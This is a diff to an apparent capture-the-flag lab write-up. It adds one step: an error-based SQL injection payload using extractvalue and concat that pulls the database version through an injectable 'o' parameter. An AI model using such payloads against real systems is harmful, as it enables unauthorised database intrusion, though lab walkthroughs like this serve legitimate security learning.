@@ -84,6 +84,7 @@ Machine IP: 10.10.10.113 - Debian
   - Inject a `'` after the `o` parameter in the query.
 ![image](https://user-images.githubusercontent.com/83878909/229354603-aef8edb5-23e7-40b8-8785-f45b4515d517.png)
   - Extract the version information.
+  - Query: `') and extractvalue(0x0a,concat(0x0a,version()))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229354803-2b283325-cc0c-4561-bceb-4a890f1a6e1d.png)
 
 
